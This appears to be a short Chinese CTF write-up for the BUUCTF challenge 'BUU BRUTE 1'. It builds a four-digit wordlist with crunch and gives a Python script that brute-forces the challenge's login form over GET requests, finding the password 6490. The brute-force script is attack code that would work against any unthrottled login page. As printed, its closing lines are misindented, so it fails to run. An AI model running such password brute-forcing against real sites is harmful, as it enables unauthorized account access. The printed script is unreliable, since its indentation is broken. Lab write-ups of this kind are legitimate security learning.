# BUUCTF - BUU BRUTE 1 Writeup


进入题目url查看，是个登录界面，先输入admin/admin发现提示

```html
密码错误，为四位数字。
```

而且是get请求，结合题目，简单爆破

## crunch生成字典

```bash
crunch 4 4 -f /usr/share/crunch/charset.lst numeric -o adminpass.txt
```

## 爆破脚本

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
import time

f = open('./adminpass.txt','r')
payload = f.readline().strip()
while payload:
  print('\rpayload:'+payload,end="")
  res = requests.get("http://d60d9c19-efe0-4b6a-82c5-0d238a94a44b.node4.buuoj.cn:81/?username=admin&password="+payload)
  time.sleep(0.2)
  if '密码错误' not in res.text:
    print(res.text)
      f.close()
      break
    else:
      payload = f.readline().strip()
```

payload:6490登录成功。flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}

